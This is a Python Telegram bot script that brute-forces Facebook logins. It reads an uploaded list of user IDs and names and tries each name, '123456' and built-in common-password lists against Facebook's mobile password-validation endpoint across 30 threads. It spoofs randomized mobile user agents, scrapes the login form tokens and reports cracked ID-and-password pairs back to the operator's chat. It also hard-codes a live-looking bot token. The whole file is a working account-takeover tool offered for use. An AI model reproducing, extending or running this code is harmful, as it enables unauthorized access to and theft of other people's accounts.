import telebot
import time
import requests
import random
import re
import os
from concurrent.futures import ThreadPoolExecutor as THREADING
from telebot import types

tok = '6499198312:AAG1VAJHQ9pf0XD7UHA2Em5zXhisPxkgwe8'
bot = telebot.TeleBot(tok)

ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []

try:
    PROXY = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
    with open('PROXYZ.txt', 'w', encoding='utf-8') as f:
        f.write(PROXY)
except:
    pass

with open('PROXYZ.txt', 'r', encoding='utf-8') as f:
    PROXY = f.read().splitlines()

def generate_user_agent_android():
    version_a = f'{random.randrange(1, 9)}.{random.randrange(1, 9)}'
    device_a = '11; Redmi Note 5A Lite)'
    extras_a = f'{random.randrange(100, 9999)} AppleWebKit/537.36 (KHTML, like Gecko) {random.randrange(1, 9)}.{random.randrange(1, 4)}.{random.randrange(1, 4)}.{random.randrange(1, 4)} Chrome/96.0.4664.45 Mobile Safari/537.36'
    return f'Mozilla/5.0 (Linux; Android {version_a} {device_a} {extras_a}'

ugen2 = [generate_user_agent_android() for _ in range(10000)]

def generate_user_agent_android_12():
    version_b = '12;'
    device_b = 'M2101K6G'
    letter = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    number = random.randrange(1, 999)
    extras_b = f'Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) {random.randrange(80, 103)}.0.0.{random.randrange(4200, 4900)} {random.randrange(40, 150)} Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
    return f'Mozilla/5.0 (Linux; Android {version_b} {letter}{device_b}{number}{letter}) {extras_b}'

ugen = [generate_user_agent_android_12() for _ in range(10000)]

id_list, id2, loop, ok, cp, akun, oprek, method, taplikasi, uid = [], [], 0, 0, 0, [], [], [], [], []
pwpluss, pwnya = [], []
x = ''
FILE_OK = 'OK.txt'
FILE_CP = 'CP.txt'

ok_accounts = []
cp_accounts = []
lang = 'ar'

@bot.message_handler(commands=['start'])
def send_welcome(message):
    keyboard = types.InlineKeyboardMarkup()
    arabic_button = types.InlineKeyboardButton("الــعـربـيـة 🇮🇶", callback_data='ar')
    english_button = types.InlineKeyboardButton("English 🇺🇸", callback_data='en')
    keyboard.add(arabic_button, english_button)
    bot.reply_to(message, "أخـــــتر مـــــاهي اللـغه الـــتي تُفضلها . ", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data in ['ar', 'en'])
def set_language(call):
    global lang
    lang = call.data
    if lang == 'ar':
        bot.send_message(call.message.chat.id, ". أرسل الملف الان للبدء .")
    elif lang == 'en':
        bot.send_message(call.message.chat.id, ". Send the file now to start .")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open('Goldtest.txt', 'wb') as new_file:
            new_file.write(downloaded_file)
        
        global id2
        with open('Goldtest.txt', 'r', encoding='utf-8') as file:
            id2 = file.readlines()

        if lang == 'ar':
            bot.send_message(message.chat.id, """— /pass_1 — [ 🇮🇶 ] — [ ✅ ]

— /pass_2 — [ 🇮🇶 ] — [ ✅ ]

— /pass_3 — [ 🇮🇶 ] — [ ✅ ]

اخــتر من الأوامـر للتـخـميـن كـلمـات الـسر .

 يمكـنك مشـاهدة كلـمات الــسر مـاهــية . """)
        elif lang == 'en':
            bot.send_message(message.chat.id, """— /pass_1 — [ 🇮🇶 ] — [ ✅ ]

— /pass_2 — [ 🇮🇶 ] — [ ✅ ]

— /pass_3 — [ 🇮🇶 ] — [ ✅ ]


choose from the commands to guess the password .

you can see what the password are . """)

    except Exception as e:
        bot.reply_to(message, f"حدث خطأ: {e}" if lang == 'ar' else f"An error occurred: {e}")

@bot.message_handler(commands=['pass_1', 'pass_2', 'pass_3'])
def handle_iq_commands(message):
    command = message.text
    if command == '/pass_1':
        pas = ['19901990', '19911991', '19921992', '19931993', '19941994', '19951995', '19961996', '19971997', '19981998', '19991999', '19801980', '19811981', '19821982', '19831983', '19841984', '19851985', '19861986', '19871987', '19881988', '19891989', '1122334455', '112233445566', '11223344556677', '123456123456', '1234512345', '12345671234567', '1122334455@', '12345@@', '12345@', '00998877', '10002000', '٠٩٨٧٦٥٤٣٢١', '1020304050', '20202020', '102030405060', '1020304050', '10203040', 'qqwweerr', 'qqwweerrtt', 'aassddff', 'zzxxccvv', 'ppooiiuu', 'mmnnbbvv', 'qwerqwer', 'qwertqwert', 'asdfasdf', 'zxcvzxcv', 'poiupoiu', '1q2w3e4r', '1q2w3e4r5t']
    elif command == '/pass_2':
        pas = ['qqwweerr', 'qqwweerrtt', 'aassddff', 'zzxxccvv', 'ppooiiuu', 'mmnnbbvv', 'qwerqwer', 'qwertqwert', 'asdfasdf', 'zxcvzxcv', 'poiupoiu', '1q2w3e4r', '1q2w3e4r5t']
    elif command == '/pass_3':
        pas = ['1122334455', '112233445566', '11223344556677', '123456123456', '1234512345', '12345671234567', '1122334455@', '12345@@', '12345@', '00998877', '10002000', '٠٩٨٧٦٥٤٣٢١', '1020304050', '20202020', '102030405060', '1020304050', '10203040']

    if lang == 'ar':
        progress_message = bot.send_message(message.chat.id, """لـوقيف الــفحـص  - /stop
لمـعرفـة الحسـابـات الـصـحـيحة يـمكـنك ارسـال امـر -  /ok
لمـعرفـة الحسـابـات الـخاطـئة يـمكـنك ارسـال امـر -  /cp""")
    elif lang == 'en':
        progress_message = bot.send_message(message.chat.id, """To stop the check - /stop
To know the correct accounts, you can send the command - /ok
To know the incorrect accounts, you can send the command - /cp""")

    progress_markup = create_progress_markup(ok, cp, loop, len(id2))
    bot.edit_message_reply_markup(chat_id=message.chat.id, message_id=progress_message.message_id, reply_markup=progress_markup)

    PASOWRD(message, progress_message, pas)

def create_progress_markup(ok, cp, loop, total):
    test1 = types.InlineKeyboardMarkup(row_width=1)
    Goldstart1 = types.InlineKeyboardButton(f"• Total ♻️ : [{total}] •", callback_data='x')
    Goldstart2 = types.InlineKeyboardButton(f"• Hits ✅ : [{ok}] •", callback_data='x')
    Goldstart3 = types.InlineKeyboardButton(f"• Bad ❌ : [{cp}] •", callback_data='x')
    Goldstart4 = types.InlineKeyboardButton(f"• Check ⚠️ : [{loop}] •", callback_data='x')
    test1.add(Goldstart1, Goldstart2, Goldstart3, Goldstart4)
    return test1

def PASOWRD(message, progress_message, pas):
    with THREADING(max_workers=30) as pool:
        for idf, nmf in (yuzong.split('|')[:2] for yuzong in id2):
            frs = nmf.split(' ')[0]
            pwv = [nmf] if len(frs) >= 3 else [nmf, '123456']
            pwv.extend(pas)
            pwv.extend(pwnya if 'ya' in pwpluss else [])
            pool.submit(CHECK, idf, pwv, message, progress_message)
    bot.send_message(message.chat.id, f'Golden : Ilove you . ')

def CHECK(idf, pwv, message, progress_message):
    global loop, ok, cp, ok_accounts, cp_accounts
    ua, ua2, ses = random.choice(ugen), random.choice(ugen2), requests.Session()
    for pw in pwv:
        try:
            ses.headers.update({"Host": 'm.facebook.com', "upgrade-insecure-requests": "1", "user-agent": ua2, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document", "referer": "https://m.facebook.com/", "accept-encoding": "gzip, deflate br", "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            
            lsd_value = re.search('name="lsd" value="(.*?)"', str(p))
            jazoest_value = re.search('name="jazoest" value="(.*?)"', str(p))

            if lsd_value is None or jazoest_value is None:
                continue

            dataa = {"lsd": lsd_value.group(1), "jazoest": jazoest_value.group(1), "uid": idf, "flow": "login_no_pin", "pass": pw, "next": "https://developers.facebook.com/tools/debug/accesstoken/"}
            ses.headers.update({"Host": 'm.facebook.com', "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "origin": "https://m.facebook.com", "content-type": "application/x-www-form-urlencoded", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document", "referer": "https://m.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                cp_accounts.append(f'{idf} | {pw}')
                cp += 1
                bot.send_message(message.chat.id, f' [CP] {idf} | {pw}')
                break
            elif 'c_user' in ses.cookies.get_dict().keys():
                ok_accounts.append(f'{idf} | {pw}')
                ok += 1
                bot.send_message(message.chat.id, f' [OK] {idf} | {pw}')
                break
        except Exception as e:
            print(f"Error: {e}")
            continue
    loop += 1
    progress_markup = create_progress_markup(ok, cp, loop, len(id2))
    bot.edit_message_reply_markup(chat_id=message.chat.id, message_id=progress_message.message_id, reply_markup=progress_markup)

@bot.message_handler(commands=['stop'])
def stop(message):
    if lang == 'ar':
        bot.send_message(message.chat.id, "تــم ايــقاف الــفحص .")
    elif lang == 'en':
        bot.send_message(message.chat.id, "Check stopp .")

@bot.message_handler(commands=['ok'])
def send_ok(message):
    if ok == 0:
        if lang == 'ar':
            bot.send_message(message.chat.id, "عدد الحسابات ✅ : 0")
        elif lang == 'en':
            bot.send_message(message.chat.id, "number of valid accounts ✅ : 0")
    else:
        if lang == 'ar':
            bot.send_message(message.chat.id, "عدد الحسابات ✅ : \n" + "\n".join(ok_accounts))
        elif lang == 'en':
            bot.send_message(message.chat.id, "number of valid accounts ✅ : \n" + "\n".join(ok_accounts))

@bot.message_handler(commands=['cp'])
def send_cp(message):
    if cp == 0:
        if lang == 'ar':
            bot.send_message(message.chat.id, "عدد الحسابات ❌ : 0")
        elif lang == 'en':
            bot.send_message(message.chat.id, "number of invalid accounts ❌ : 0")
    else:
        if lang == 'ar':
            bot.send_message(message.chat.id, "عدد الحسابات ❌ :\n" + "\n".join(cp_accounts))
        elif lang == 'en':
            bot.send_message(message.chat.id, "number of invalid accounts ❌ :\n" + "\n".join(cp_accounts))

@bot.message_handler(commands=['dev'])
def send_dev(message):
    bot.send_message(message.chat.id, "- by | Golden .\n\n- tele | @u_w1w .")

bot.polling(none_stop=True)
